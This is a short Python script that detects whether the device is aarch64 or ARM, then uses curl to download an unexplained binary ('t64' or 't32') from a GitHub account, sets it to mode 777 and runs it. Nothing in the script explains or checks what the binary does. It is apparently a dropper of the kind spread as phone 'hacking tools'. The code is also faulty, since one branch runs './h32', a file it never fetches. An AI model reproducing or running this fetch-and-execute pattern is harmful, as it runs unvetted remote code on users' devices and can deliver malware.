#coding=utf-8
import os
import sys
import subprocess
current_os = subprocess.check_output('uname -om',shell=True)
if 'aarch64' in str(current_os):
    if not os.path.isfile('t64'):
        os.system('curl -L https://github.com/tcoder99/files/blob/main/t64?raw=true > t64')
        os.system('chmod 777 t64')
        os.system('./t64')
    else:
        os.system('./t64')
elif 'arm' in str(current_os):
    if not os.path.isfile('t32'):
        os.system('curl -L https://github.com/tcoder99/files/blob/main/t32?raw=true > t32')
        os.system('chmod 777 t32')
        os.system('./t32')
    else:
        os.system('./h32')
else:
    print('\n  Unknown device, aarch or os found ...')
os.sys.exit()
